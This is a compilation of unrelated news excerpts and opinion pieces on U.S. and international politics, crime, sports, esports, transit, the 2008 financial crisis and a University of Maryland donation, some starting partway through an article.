One of the Packers' strengths on offense is the interior of their line with guards Josh Sitton and T.J. Lang, and center Corey Linsley. But they're in for a major challenge Sunday against Brockers, Fairley and especially Donald.
"Aaron Donald sets the tone for everything," the scout said. "Wait until you see the film. He's tossing (Justin) Britt and (J.R.) Sweezy, the two guards from Seattle, he's literally tossing them on their (butt). It's unbelievable."
Quinn has 43 sacks in his last 52 games and is as good an edge rusher as there is in the league. He generally lines up at right end, so he'll mostly be matched against left tackle David Bakhtiari.
"Robert Quinn is one of those freaks," said a scout from another NFC team. "He can get about six inches off the ground (turning the corner), and tackles can't lay a glove on him. He comes around the tackles through the back door on the quarterback. Those are the top two players on that team."
So the Rams go into Sunday's game with just the kind of defense that matches up against the Packers. They have the talent to pressure quarterback Aaron Rodgers with four rushers, which means they can cover with seven.
The Packers are 9-to 10-point favorites, but with the Rams' front four it's hard to see why the spread is that big. This figures to be a very tough matchup, and the Packers could end up needing all of Rodgers' mobility to win the day.
"(The Rams) are almost on par (with Seattle) as far as defense," one of the scouts said. "I'd have to give Seattle the nod for the better overall front seven, they have the linebackers and everything. But (the Rams) will beat you up so you're limping into the next week. That's what a lot of teams in the league are worrying about."

The House Ethics Committee on Thursday night cleared Rep. Devin Nunes, R-Calif., chairman of the House Intelligence Committee, on allegations that he mishandled classified information when he said a Trump transition team member had their communications monitored by the U.S. intelligence community.
A complaint was filed over the disclosed information, and Nunes announced he would step aside from leading the investigation into the Russia's meddling in the 2016 investigation.
The Ethics Committee said that following the analysis from "classification experts," it has determined that what Nunes disclosed was not classified information, ending their investigation into the Republican lawmaker's comments.
Nunes responded to the announcement by thanking the ethics panel for clearing him, but voiced his disappointment that the "frivolous" allegations against him took eight full months to be dismissed.
“I respect the ethics process, but I remain dismayed that it took an unbelievable eight months for the Committee to dismiss this matter,” Nunes said in a statement.
Nunes also called on the committee to release all transcripts related to his case.
“I am also concerned by public statements made by four of the Ethics Committee's five Democrats that appeared to prejudge this matter before they began investigating the complaint," Nunes said. "I therefore call on the Ethics Committee to publicly release all its transcripts related to my case."
The announcement clears the way for Nunes to return to the head of his committee's inquiry into Russia.
WASHINGTON, Oct. 7 (UPI) -- Advances in DNA technology and the willingness of victims to work with police are reducing the number of reported U.S. rapes, advocates say.
Statistics provided by the FBI indicate 89,000 women reported being raped in 2008, or 29 women per 100,000 people, which is well down from the 109,062 reported rapes in 1992, or 43 women for every 100,000 people, USA Today reported Wednesday.
"We have seen reform in how police work with victims, gather evidence and investigate rape; we've seen increased awareness of the crime, and we've seen better prosecution," Michael Males, senior researcher for the Center on Juvenile & Criminal Justice in San Francisco, told the newspaper. "Hospitals now have rape kits that they didn't have 40 years ago."
"The level of interest and professionalism dealing with sexual assault cases increased as a result," added Scott Berkowitz, president of the victims advocacy group Rape, Abuse & Incest National Network.
Kim Gandy, past president of the National Organization for Women and a former prosecutor, told USA Today DNA testing can now pinpoint a rapist, enabling prosecutors to use more than just a victim's identification of an attacker.

NEWPORT NEWS, Va. (WAVY) -- Police have charged a 17-year-old girl with felony homicide, hit-and-run, evade and elude police and operating a motor vehicle with no driver's license, after striking and killing a man mowing grass Friday afternoon.
42-year-old Arnold Coates died after being hit on Red Oak Circle around 3:30 p.m., according to police.
"He was a very nice guy. He always took care of his yard and took care of his car," said Michael Chiesa, longtime friend and next door neighbor. "He would do anything to help you out."
Police say the situation started two blocks from Coates' home just minutes earlier. Officers say they pulled over 34-year-old Shawn Collier at Tyner and Richneck Roads to serve a drug-related warrant.

As officers arrested Collier, who was wanted in Henrico and Chesterfield, they say the 17-year-old hopped in the front seat and drove away from the traffic stop.
Even after hitting Coates outside of his home a few minutes later, police say the teen driver kept going.
"It says they are not human. How can you do that? How can you not stop and look and see if he is okay?" said Brandy McCreery.
The girl ultimately slammed into an SUV just a few houses down, and police say she tried to run once more.
"Airbags deployed, she's shaking her head, door opens up, feet come out, she takes off running, full sprint," recalled Peter Chandler, another neighbor mowing his yard a few houses down.
Police say the driver ran to a nearby home, used their phone to call a relative and ultimately surrendered to officers at the scene.
Chiesa describes Coates as an Army veteran, a man with a big heart and a well-liked guy.
"Tomorrow is not promised," said Chiesa. "All you got is today. So, if you got somebody you love, you have to tell them you love them every night, because you never know what's going to happen."
The family has set up a GoFundMe for Coates' funeral costs. Click here to donate.

MANILA - Commuters should seek alternative means of transportation on Monday, as transport groups are set to stage a strike in Metro Manila and in select provinces in protest of a looming jeepney phaseout.
The strike, which will start early on February 27, aims to prod government to give up its planned phaseout of old jeepneys, and a required P7 million minimum capital for jeepney operators and 10 minimum units for each franchise.
In a statement, transport group PISTON said its members in Metro Manila and allies in several provinces already confirmed participation in the strike.
Metro Manila jeepney drivers will convene at Monumento Circle 6 a.m. on Monday, and at other “protest centers” around the city.
They will gather at the Quezon City Elliptical Circle around 11 a.m. before marching to Mendiola.
A similar transport strike staged earlier in February caused hundreds of passengers to be stranded, and prompted some schools to cancel classes.
To help ease the public's woes, the government deployed its vehicles to provide free rides to stranded commuters.
As of posting, the government has yet to announce whether it will do the same for the upcoming strike. However, the Land Transportation Franchising and Regulatory Board (LTFRB) said it has met with the Metro Manila Development Authority (MMDA), partner agencies and the transport sector to address the issues.
Adieu, Turkish Democracy
It's already become a cliché to say that the results of Turkey's Nov. 1 parliamentary elections, officially confirmed on Thursday, were “stunning.” But that doesn't make it any less true. Most observers believed that far and away the likeliest outcome would be a re-run of the June 7 elections, which saw the Justice and Development Party (AKP) lose the ruling majority that had empowered it to dominate Turkish politics since 2002. A few analysts allowed for the slim possibility that the AKP might yet eke out a razor-thin majority. But virtually no one — not the experts and certainly not the pollsters — foreshadowed what actually happened: a resounding AKP victory, a pickup from June of nearly 5 million votes and almost 60 seats. In just 5 months, the AKP had gone from badly weakened and on the ropes to triumphant and once again dominant. The sudden reversal of fortune was all the more shocking precisely because it was so unexpected.
Unexpected, that is, by everyone except President Recep Tayyip Erdoğan, the architect of the AKP comeback. After the June elections produced a hung parliament, it was Erdoğan who scuttled coalition talks and insisted on going back to the polls to reclaim the AKP's majority. When the Kurdistan Workers' Party (PKK) assassinated two policemen in July, it was Erdoğan who seized upon the provocation to declare the peace process dead, re-launch Turkey's war on the PKK, and demonize the Kurdish-dominated People's Democratic Party (HDP) as a terrorist front.
And it was Erdoğan, of course, who in the weeks and months leading up to the ballot redoubled the state's crackdown on all potential challengers to the AKP's resurgence. A small sampling gives the flavor:
With police often standing by, nationalist mobs ransacked hundreds of HDP offices around the country, while police and prosecutors harassed and arrested scores of HDP activists.
In early September, club-wielding protesters led by an AKP member of parliament attacked the headquarters of one of the country's leading opposition papers, Hurriyet. The AKP parliamentarian told the crowd that the paper's owner, the Dogan Media Group, “will clear off from this country after the Nov. 1 elections.” He was also caught on video threatening Hurriyet's editor-in-chief and one of its top columnists, declaring, “Those people have never had a beating. Our mistake was not to give them a beating early on.” Within weeks, a group of thugs consisting primarily of AKP members made good on the threat, assaulting the columnist outside his home, putting him in the hospital with a broken nose and ribs.
Just a week before the Nov. 1 vote, the state seized two TV stations and two newspapers owned by an opposition media group, appointing a new board of trustees dominated by pro-AKP figures. The broadcast stations went dark while the papers were transformed almost overnight into AKP platforms.
In short, Erdoğan quite systematically pursued an electoral strategy of fomenting instability, insecurity, conflict, and violence. Manufactured chaos, if you will. His message to the Turkish people was clear, as much veiled threat as prediction: If you don't revisit the June results, if you don't return the AKP to a position of monopoly power, your lives are likely to get much, much worse. Only Erdoğan — not some unruly, weak coalition government — can fight terrorism, enforce stability, and deliver the prosperity that Turks have grown accustomed to the past 13 years.
Most Turkey watchers perceived Erdoğan's gambit as a transparently cynical move that was doomed to fail, the desperate act of an increasingly paranoid despot, a wannabe sultan sensing his power slipping away. The prevailing assumption was that the Turkish public would see through it, too, especially after delivering such a stinging rebuke to Erdoğan's authoritarian ambitions just a few months earlier. Certainly, they wouldn't now turn around and reward Erdoğan's arson spree by embracing him as the fireman, right?
Wrong. That appears to be exactly what happened. Erdoğan's decision to put a match to the Kurdish conflict had two main objectives. First, to whip up nationalist hysteria behind the AKP. And second, to drive down support for the HDP. He succeeded on both accounts, and quite spectacularly. The anti-Kurdish National Movement Party (MHP) hemorrhaged right-wing support to the AKP, losing 40 seats. At the same time, after defecting to the HDP in June in what appeared to be a tide of pan-Kurdish solidarity linked to the Syrian conflict, more than a million conservative Kurds returned to the AKP fold in November — apparently buying in to Erdoğan's narrative that the PKK was primarily responsible for the resumption of violence afflicting Kurdish cities and towns, and angered by the HDPseems inability, or unwillingness, to rein it in.
The success of Erdoğan's gamble was really quite breathtaking when you think about it. By collapsing the peace process and unleashing war on the PKK he did something that, intuitively, seemed almost impossible: he rallied to his side not only anti-Kurdish nationalists, but a significant bloc of Kurds as well. No mean feat that. Especially given the fact that the flight of Kurds from the AKP in June had been widely thought to be irreversible, a function of their deep sense of betrayal at Erdoğan's hostile response to the plight of Kobani, the Syrian Kurdish village on the Turkish border that came under the Islamic State assault in late 2014. The aftershocks of Kobani were supposed to have been felt in Turkish politics for years to come. As it turned out, they seem to have lasted for all of five months.
What Erdoğan appears to have sensed better than anyone is the premium that conservative voters, both Turks and Kurds alike, were prepared to place on stability. Faced with a rising tide of chaos, which included horrific bombings in Suruc and Ankara perpetrated by the Islamic State, they returned en masse to the one power — Erdoğan and the AKP — that they believed might plausibly be able to restore order if granted sufficient authority. The fact that Erdoğan may have played a major role in stoking the violence in the first place seemed of secondary importance at best — if it was considered at all.
At any rate, by November, the hung parliament delivered by June's elections; the voters' indulgence of Turkey's notoriously feckless opposition parties; the democratic impulse to push back against Erdoğan's growing authoritarianism — all that seemed like something of a luxury, a passing summer fancy. Now confronting crises across multiple fronts — the PKK, the Islamic State, the Syrian war, a mass influx of refugees, and a currency in free fall — it was time for voters to get their priorities straight. Stability first and foremost. And if stability was the question, the only credible answer for at least half the voters was an empowered AKP and its capo dei capi, President Erdoğan.
It was a potent reminder, if any were needed, of Erdoğan's singular mastery over Turkish politics. The notion that the setback he suffered in June might mark the beginning of the end of his reign was proven to be so much wishful thinking. In hindsight, it was at most a temporary stumble. When it comes to manipulating, browbeating, intimidating, seducing, and demagoguing the Turkish public to serve his political ends, Erdoğan simply remains without equal. A giant among dwarves who can never be counted out. Willpower, resilience, and sheer ruthlessness personified.
The question now is where does all this leave us? The Turkish people may have voted for stability, but are they likely to get it? I'll admit to not being particularly optimistic. Perhaps there's a chance that Erdoğan interprets the past five months as a cautionary tale of sorts, a warning about the risks of political overreach, of a majoritarian approach to power that treats one half of the country as an enemy to be crushed rather than a loyal opposition to be debated and engaged. Perhaps he backs off his megalomaniacal obsession to transform Turkey's constitution by establishing an all-powerful executive presidency with himself at the helm, and instead focuses on an agenda of easing political tensions, encouraging much-needed economic reforms, and re-establishing the rule of law, freedom of the press, and judicial independence. And perhaps he moves quickly to resurrect a settlement process that genuinely seeks to resolve the Kurdish question within the context of Turkey's democracy and a more generous conception of Turkish citizenship.
Or perhaps not. Unfortunately, based on Erdoğan's record, this seems to me the far more likely scenario. Magnanimity has simply not been part of the repertoire. Instead, my fear is that the lesson Erdoğan takes from these elections is the need to move even more aggressively than heretofore to neutralize all those who might challenge his rule — in the media especially, but far beyond it as well, including the business sector, civil society, opposition parties, and any state institutions that remain even nominally independent. Get them before they get him. The victory he won on Nov. 1 is not a reason to scale back his zero-sum approach to politics, but a vindication of it, and a mandate to pursue his agenda even more forcefully going forward.
That certainly means pressing ahead with the extremely polarizing effort to build an imperial presidency — whether de facto as he's been doing for the past year in contravention of the existing constitution, or de jure by force feeding a new constitution to the country whether it wants it or not. It's true that the AKP's new majority of 317 seats in parliament leaves it at least 13 votes shy of the 330 required to submit a constitutional referendum to the public. But with strong political winds now at his back and all the inducements of state power, as well as the punishments of state coercion, at his fingertips, securing the cooperation of a handful of self-interested parliamentarians hardly seems like mission impossible for an aspiring despot of Erdoğan's caliber.
As for the peace process, it's hard to be optimistic. It's true that Erdoğan did more to address Kurdish grievances than any previous Turkish leader. But the suspicion lingers that the effort was always more instrumental in nature, designed in the first instance to serve Erdoğan's broader political ambitions rather than actually dealing with core Kurdish demands.
If anything, the experience of the past several months has only underscored the importance of the nationalist right-wing to Erdoğan's power base. Pursuing the settlement process almost cost him dearly on June 7, while the collapse of that process appears to have been the key to victory on Nov. 1. While Erdoğan almost certainly appreciates that his interests would not be well served by the high political, economic, and security costs of a drawn-out war, the same cannot necessarily be said of a persistent, low-level conflict that keeps tensions simmering and allows him to strike a nationalist pose against those who would threaten Turkey's territorial integrity.
That harder line on the Kurdish issue may also augur problems in Syria, where the United States is counting on the PKK's Syrian affiliate, the Popular Protection Unit (YPG), to play a major role in fighting the Islamic State — including by leading a Kurdish-Arab coalition in pressuring Raqqa, the Islamic State's capital. Erdoğan has made clear that Turkey views the YPG as a terrorist group, whose military advancements along the Turkish border and close links to the PKK pose a clear and present danger. As does, the Turks warn, any budding U.S.-YPG military alliance. How far the Turks are prepared to go in pressing this point is not certain. There have already been isolated incidents of Turkish artillery and air attacks on YPG positions. It's known that many Turkish Kurds are fighting in Syria, and Turkish officials have warned of the crisis that could be triggered in U.S.-Turkish relations should U.S. weapons supplied to YPG-aligned forces start showing up in the PKK's arsenal for use against Turkish targets.
No doubt reaching some better understandings on the way forward in Syria will be at the top of the list of subjects that President Obama will want to discuss when he visits Turkey early next week for the G-20 Summit in Antalya. The Turks may oppose the growing U.S. reliance on the YPG to battle the Islamic State, but what's their alternative? The answer can't be the equally dangerous non-Islamic State jihadists that Turkey's lax cross-border policy has done so much to empower in recent years. Are the Turks themselves prepared finally to step up and play a more direct military role, including perhaps by deploying troops to police a possible safe zone?
Setting aside these differences, U.S. officials almost certainly felt some relief with the AKP's election victory and the prospect of a strong government in Ankara that's capable of making decisions — including allowing the United States to continue ramping up its combat operations against the Islamic State from Turkish bases. While elements of the Obama administration issued periodic squeaks of concern over Erdoğan's more egregious media attacks, both in the run-up to Nov. 1 and in its aftermath, its shown no stomach whatsoever for developing a sustained, medium-term strategy — backed by the president and his secretary of state — to bolster Turkey's democracy in the face of Erdoğan's systematic efforts to dismantle it.
Given the priority of managing the mess in Syria, and prosecuting the war against the Islamic State, that may be understandable. But it's also probably shortsighted. It's hard to believe that over time Turkey can be the reliable and stable ally and NATO partner that America so badly needs if it continues hurtling toward despotism. Putinism with a very nasty Islamist twist.
But that, unfortunately, is where we now seem headed after Nov. 1, and at an accelerating speed. In retrospect, my guess is that we will look back on these past five months as an historical hinge point for Turkey, a moment in time after June 7 when the Turkish electorate might still have taken the last-chance exit ramp off of Erdoğan's superhighway to dictatorship. But it failed to do so and may now have ended up in the express lane instead — with democracy, the rule of law, freedom of speech, and human rights all receding further and further into the rear-view mirror.

Melbourne's train commuters will receive no immediate relief from the peak-hour crush, with no plans to significantly boost train timetables until at least the end of the year.
The last major timetable change was June 2014, despite demand for train travel growing by 6.5 million journeys a year and peak-hour overcrowding worsening on the city's busiest lines.
The Andrews government has allowed the overcrowding problem to fester despite opening the Regional Rail Link 13 months ago, which created the capacity to run an extra 23 peak-hour trains between the city and the fast-growing northern and western suburbs.
Those extra trains were planned to run on the Werribee, Craigieburn and Sunbury lines, three of the four worst lines in Melbourne for peak-hour crushes. They would have enabled an extra 54,000 passengers to access public transport.

The origin of the U.S. financial crisis is that commercial banks and investment banks lent vast sums—trillions of dollars—for housing purchases and consumer loans to borrowers ill-equipped to repay. The easy lending pushed up housing prices around the U.S., which then ratcheted still higher when speculators bought houses on the expectation of yet further price increases. When the easy lending slowed and then stopped during 2006-07, the housing prices peaked and began to fall. The housing boom began to unravel and now threatens an economy-wide bust.
The U.S. economy faces four cascading threats: First, the sharp decline in consumer spending on houses, autos and other durables, following the sharp decline in lending to households, will cause a recession as construction of new houses and production of consumer durables nosedive. Second, many homeowners will default on their mortgage payments and consumer loans, especially as house values fall below the mortgage values. Third, the banking sector will cut back sharply on its lending in line with the fall in its capital following the write-off of bad mortgage and consumer loans. Those capital losses will push still more financial institutions into bankruptcy or forced mergers with stronger banks. Fourth, the retrenchment of lending now threatens even the shortest-term loans, which banks and other institutions lend to each other for working capital. Interbank loans and other commercial paper are extremely hard to place.
The gravest risks to the economy come back to front. The fourth threat is by far the worst. If the short-term commercial paper and money markets were to break down, the economy could go into a severe collapse because solvent and profitable businesses would be unable to attract working capital. Unemployment, now at 6 percent of the labor force, could soar to more than 10 percent. That kind of liquidity collapse was the basic reason why Asian national incomes declined by around 10 percent between 1997 and 1998, and why the U.S. economy fell by around 25 percent during the Great Depression.
The third threat, the serious impairment of bank capital as banks write off their bad loans, could cause a severe recession, but not a depression. Unemployment might rise, for example, up to 10 percent, which would create enormous social hardships. The ongoing fall in bank capital as the housing boom turns to bust is already forcing banks to cut back their outstanding loans significantly, because they must keep the lending in proportion to their now-shrunken capital base. Major investment projects, such as acquisition of new buildings and major machinery, are being scaled back. Some major nonfinancial companies will likely go bankrupt as well.
The second threat, the financial distress of homeowners, will certainly be painful for millions of households, especially the ones that borrowed heavily in recent years. Many will lose their homes; some will be pushed into bankruptcy. Some may see their credit terms eased in renegotiations with their banks. Consumers as a group will start to become net savers again after years of heavy net borrowing. That trend will not be bad in the long term but will be painful in the short run.
The first threat, the cutback in sales of housing and other consumer durables, is the Humpty-Dumpty of the economy that cannot be put back together. The inventory of unsold homes is now large; housing demand and new construction will be low for many years. Consumer spending on appliances and autos is also plummeting. All these consequences are largely unavoidable and will force the U.S. into at least a modest recession, with unemployment likely to rise temporarily to perhaps 8 percent.
The goal of any new policy cannot be to prevent a recession. It's too late to stop such a downturn. The goal cannot be to save every bank. The U.S. economy has built up too many imbalances—consumer debt, overextended construction, impaired capital of banks—to avoid an economic downturn and a major retrenchment of the banking sector. The goal must be to avoid an outright collapse or deep recession. Two actions are therefore critical, and two more are subsidiary but still important.
Most important, the government and Federal Reserve Board must prevent the collapse of working capital by supplying short-term loans and taking other measures to sustain the commercial paper market, interbank lending and the smooth functioning of money market funds. They have the instruments to do so, and should use them aggressively. The government should also aggressively promote a recapitalization of the banking system so that bank lending is not squeezed for years to come. It can directly inject some public capital into banks, and can both pressure and entice the banks to raise additional private capital. Unfortunately, the $700-billion bailout nearing approval in Congress does not focus adequately on those liquidity or recapitalization challenges.The legislation is better than nothing (to help forestall panic) but the real work of stabilizing and recapitalizing the banking system will now await the next administration, and the Federal Reserve will need to stay aggressive in preventing a liquidity collapse."
Two additional steps will be useful. The first will be to ease the repayment terms on existing mortgage holders, to reduce the flood of defaults and foreclosures that will otherwise occur. The second is to encourage expansionary monetary and fiscal policies abroad (most notably in cash-rich Asia), so that the decline in U.S. consumer spending is smoothly offset by a rise in spending in other countries. This overseas expansion would allow the U.S. to offset the fall in housing construction by a rise in exports, and would allow other countries to offset the fall in their exports to the U.S. by a rise in their internal demand. All these steps will have to await the next administration.
Timothy Egan on American politics and life, as seen from the West.
There must be a Greek tragedy, a Shakespeare play or a “Daily Show” parody to explain the exquisite irony of Newt Gingrich being destroyed by the very forces he unleashed — a smack-down that sets up 2012 as the year the moneyed elite learn to use the limitless power granted them by the Supreme Court.
The deflated Newt balloon is pathetic, to use one of his favorite words. There he was, tired and bitter on election night, after getting carpet-bombed by advertisements painting him as a soulless hack tied to Washington like sea rust on the underside of a listing ship.
He complained about “millionaire consultants” buying every television outlet to “lie” about him. He whined about getting buried under “an avalanche of negative ads” that left him “drowning in negativity.” You get the picture: ugly, sudden death, the very life snuffed out of him by things he could not control.
And yet, of course, what killed Gingrich was in part his own creation, and not just because he himself is a millionaire consultant paid to destroy or inflate on demand. The Frankenstein's monster emerged from his own shop of horrors.
Jim Cole/Associated Press
Gingrich, for the last few years, has been partners in self-promotion with Citizens United, the group that prompted the worst Supreme Court decision of the nascent 21st century, the one that granted “personhood” rights to corporations and green-lighted them to dominate American elections. More to the point, that 2010 case gave birth to shadowy super PACs that can annihilate a candidate, no holds barred, no responsibility to those pulling the strings.
If you live in Cedar Falls, and didn't like seeing Iowa nice turned into the scene from “Fargo” when a victim is ground up in the wood chipper, blame Citizens United, and the Supreme Court majority that Republicans can't praise enough. Unlimited political filth by anonymous rich groups — this is John Roberts's America.
It was a hit piece, after all, a film on Hillary Clinton produced by Citizens United, that led to the Supreme Court case. Gingrich and Citizens United have worked closely together on several other films. Gingrich loved the court decision. And on the one-year anniversary of the case, Gingrich was still effusive.
“I actually think that the Citizens United case is one of the best examples of a genuine strategy that I've seen in the years I've been in Washington,” he said.
Earlier, he'd sent out a video plea, saying, “Please join Citizens United and me in our fight for the First Amendment rights of every American.”
Yes, because every lone citizen's voice is roughly equal to, say, the $3 million or so in negative advertising spent in Iowa to crush Gingrich. Those citizens who worked at corporations, or founded super PACs, were somehow denied their First Amendment rights, in the reasoning of the court and Gingrich. Money is speech, one and the same, in their world.
If Gingrich had any guts, or lasting principles, he would now sound alarms about the absurdity of a court decision equating the Norman Rockwell citizen standing at town hall to the anonymous millions that can kill a candidate in less than month. In Gingrich's case, he fell 20 points in 20 days.
This is your democracy on meth — the post-Citizens United world. I saw it in Colorado in the 2010 election, a close senate race, where retail campaigning was overshadowed by more than $30 million spent by outside groups answering to no one. In the last month of that election, negative television ads ran nearly every minute of every day.
But Colorado was training wheels for the current presidential race, the first since the court unleashed the worst demons of American political life. Gingrich himself has a super PAC, Winning Our Future, and he's now prepared to use it like a political suicide bomb as his campaign comes to its brutal end. That group, by the way, is not to be confused with Restore Our Future, the super PAC linked to Mitt Romney that took down Gingrich in Iowa.
By law, the super PACs are not supposed to coordinate with the candidates. Oh, heavens to Betsy, no! “My goodness,” said Romney, when asked about the wealthy PAC that does his bidding, “if we coordinated in any way whatsoever we'd go to the big house.”
So, who are the people behind Restore Our Future? They're former associates of Romney's at Bain Capital, business friends of his in Utah and some of the same donors who Swift-boated John Kerry in 2004.
This legalism of “no coordination” is a filament-thin G-string. Everyone coordinates. President Obama's allies may spend up to $1 billion through their own super PAC, Priorities USA Action, and other groups. Karl Rove has promised to pollute the air waves with tens of millions of dollars in attack ads from his organization, American Crossroads.
All of this is the spawn of the Citizens United case — free speech dominated by the few, the powerful, the wealthy. It can be stalled only by forceful appeals from the leading candidates, a multi-lateral disarmament that is highly unlikely.
Among the losers, Gingrich has the least credibility complaining of the effects. What happened to him in Iowa is not what he wished for, but it is certainly what he asked for.
Democrats in Pinellas County, Florida, are objecting to a string of voter registration drives held at local Chick-fil-A restaurants, describing the location choice as “inherently unfair” and “overtly partisan.”
Chick-fil-A, which proudly supports various conservative causes, was chosen as the location for nine voter registration drives in the Tampa Bay area by Pinellas County Supervisor of Elections Deborah Clark, a Republican.
Susan McGrath, leader of the Stonewall Democrats and head of the Pinellas Democratic Party, wrote Ms. Clark a letter, saying the decision to hold the event at Chick-fil-A is as partisan as holding it at Planned Parenthood, the Tampa Bay Timesreported.
“As an elected official, you have a duty to be evenhanded and fair,” Ms. McGrath reportedly wrote. “Surely, you and your office staff do understand that using Chick-Fil-A as the base for voter registration activities is not only inherently unfair but overtly partisan as well. This company has a strong and well-understood history of anti-LGBT activism and is publicly associated with Republican Party values.”
“While some Democrats may occasionally dine at Chick-fil-A (and perhaps even members of the LGBT community), the coordination of Pinellas voter registration activities with this right-leaning business very clearly conveys that your office is targeting Republican-leaning voters,” she added.
Jason Latimer, Ms. Clark's spokesman, declined to comment to the Tampa Bay Times about Ms. McGrath's letter.
Mr. Latimer said the office will hold 350 voter registration drives this year.
News Corp columnist Bolt was found to have breached the law in 2011 when he penned a column about a group of ''light-skinned'' indigenous Australians.
The column was found to be in breach of Section 18C, which makes it unlawful to publish material that offends or insults a person or group because ''of the race, colour or national or ethnic origin of the person or of some or all of the people in the group'' – the same section Senator Brandis intends to wind back.
Senator Brandis told The Australian that he was certain that the changes to the act would be viewed as the government condoning racist behaviour, but said he believed ''you cannot have a situation in a liberal democracy in which the expression of an opinion is rendered unlawful because somebody else ... finds it offensive or insulting''.
''The classic liberal democratic rights that in my view are fundamental human rights have been almost pushed to the edge of the debate,'' he said.
''It is a very important part of my agenda to re-centre that debate so that when people talk about rights, they talk about the great liberal democratic rights of freedom of expression, freedom of association, freedom of worship and freedom of the press.''

MUNCIE – A Muncie man accused of molesting a girl under the age of eight tried to turn the tables on his accuser this week.
Trevor Ross James Wages, 25, told police the child had actually sexually assaulted him.
“Guys get raped, too, not just women,” Wages told city police investigators Wednesday night.
City police officer Kristofer Swanson wrote in a report that the child told authorities during an interview that she woke up in her bed to find Wages fondling her, causing “a bad feeling” along with pain.
Confronted about the allegations, Wages maintained it was him who was sleeping when he awoke to find the girl sexually abusing him.
Wages – who said the incident took place two years ago, when the child would have been about five years old – said the attack continued for up to two minutes, with the child holding her hand over his mouth to keep him from “crying for help.”
The Muncie man also said he had consumed alcohol that night, limiting his abilities to defend himself.
Police apparently continued to view the child as the victim in the case rather than Wages. He was arrested and preliminarily charged with child molesting, a Level 3 felony carrying up to 16 years in prison.
Wages – who remained in the Delaware County jail on Thursday under a $20,000 bond – was convicted of public intoxication in 2010.

The abrupt disbandment of the Cyclowns roster midway through the European Overwatch Contenders Group Stage placed several promising players in the regions pool of free agents, three of which have already been signed by organizations looking to strengthen their rosters.
On Monday, Cyclowns announced that they had come to the conclusion to disband after five months of functioning as a player run team to allow for their players to pursue the promising opportunities that they had been presented to them by more established organizations. Laser Kittenz have snapped up Lucio player Ryan “CrusaDe” van Wegen as a substitute while Flex Emil “destro” Krastev has gone on to join Movistar Riders.
Tuomo "Davin" Leppänen, has become the latest Cyclowns player to find a new home after joining Rest in Pyjamas as the team's DPS
Earlier this week, Ninja in Pyjamas announced that they were dropping support for their Finnish Overwatch roster due to uncertainty with the Overwatch League and to focus their resources in other esports titles. Even without an organization backing them, the ex-NiP players have decided to continue their run through the second half of the double round robin groups as Team Rest in Pyjamas who currently find themselves in third place in their group with a decent record of 1-1-1 and a shot at a playoff slot.
Blizzard has yet to make an official statement regarding how they will hand the vacancy in Group D left by Cyclowns, but many believe that the teams set to face off against them will be given a bye.
The current Rest in Pyjamas roster is as follows:
A charitable foundation established by a construction magnate is giving the University of Maryland its largest private donation by far, more than $200 million to expand scholarships, endow new faculty positions and make other investments in buildings and programs at the state flagship in College Park.
The $219 million gift from the A. James & Alice B. Clark Foundation, announced Wednesday, shatters the previous record for a single donation to U-Md. — $31 million — set three years ago. It is also among the most significant gifts to any public university in the country, coming at a time when many schools have ramped up fundraising to offset declines in state support.
Euphoric U-Md. officials said the gift will enhance the 39,000-student university's strength in engineering and fields such as neuroscience and cybersecurity. They also call it a pivotal development for financial aid because a portion of the gift will be set aside to match other donations to a need-based scholarship fund that aims to help hundreds of students annually from all majors.
"It will transform access and affordability at the University of Maryland," said U-Md. President Wallace D. Loh.
A. James Clark, who died in March 2015, graduated from U-Md. in 1950 with a civil engineering degree and became a major figure in construction and development in the Washington region and around the country. Among his projects, according to the university, were Nationals Park, the World Bank headquarters, numerous Metro stations and the National Museum of the American Indian.
The highly regarded engineering school at College Park was named for Clark in 1994 after he gave $15 million to support undergraduate education. Loh estimated that Clark gave U-Md. $50 million to $60 million during his lifetime.
[A. James Clark, who built empire of concrete and glass, dies at 87]
Loh and Clark's daughter, Courtney Clark Pastrick, said the billionaire builder never forgot his modest origins. The son of an insurance salesman, Clark went to U-Md. on a scholarship after World War II and lived off campus to save money. As the family story goes, the young engineering student frequently hitchhiked to get to school via the East-West Highway from his home in Bethesda. Financial aid was essential.
"It truly changed the trajectory of his life," Pastrick said. "He talked about that often."
Pastrick, 62, of Chevy Chase, Md., who chairs the board of the family foundation, attended the announcement of the gift Wednesday in College Park with her 90-year-old mother, Alice B. Clark, who lives in Bethesda.
The foundation has also given tens of millions of dollars to endow engineering scholarships at Virginia Tech and George Washington, Johns Hopkins and Vanderbilt universities, with more in the works at the universities of Virginia and Pennsylvania.
The U-Md. gift has been under discussion for about two years. Pastrick said the foundation plans to disburse it over the next decade. "This is our largest investment to date," she said. "We love the state. We love the school. For my family and my mom, it's a really exciting time."
With its gift, U-Md. plans three financial aid initiatives. The "Clark Challenge for Maryland Promise" will help the university raise money through matching funds to support need-based scholarships for a wide spectrum of students. The second will provide scholarships to 40 engineering undergraduates a year, with priority for in-state students. And the third will target help to 40 engineering majors a year who transfer from Maryland community colleges.
For faculty, the gift will endow eight "distinguished chairs" in engineering and five "leadership chairs" in interdisciplinary fields.
The gift will also support construction of a new engineering building and expansion of another, as well as funding for engineering research and doctoral fellowships. "It will simply elevate the reputation and the impact of the university in terms of research and innovation on the great and important issues of the day," Loh said.
In September 2014, U-Md. announced a $31 million gift from Brendan Iribe , a high-tech entrepreneur who briefly attended College Park. The money supported scholarships and a new computer science building. That gift held U-Md.'s record until Wednesday.
[From 2014: Record donations to colleges in D.C., Md. and Va.]
It is tricky to compare philanthropic gifts across historical eras because of inflation. A list of major gifts kept by the Chronicle of Higher Education shows a $600 million donation to the private California Institute of Technology announced in 2001. Within the past year, $500 million gifts have been announced at both the public University of Oregon and the University of California at San Francisco.
The new U-Md. gift illuminates how College Park's fundraising has intensified in recent years. Loh said it reflects fiscal reality for public flagships across the country, with state appropriations declining as a share of total revenue. To help contain tuition increases, he said, public university leaders must emulate their private counterparts and cultivate philanthropic support. Loh, in office at U-Md. since 2010, said he and his deans spend a "significantly higher" portion of time raising money than they did in the past.
"That's the overall pattern," Loh said. "It's a pretty accurate description of what's happening nationwide."

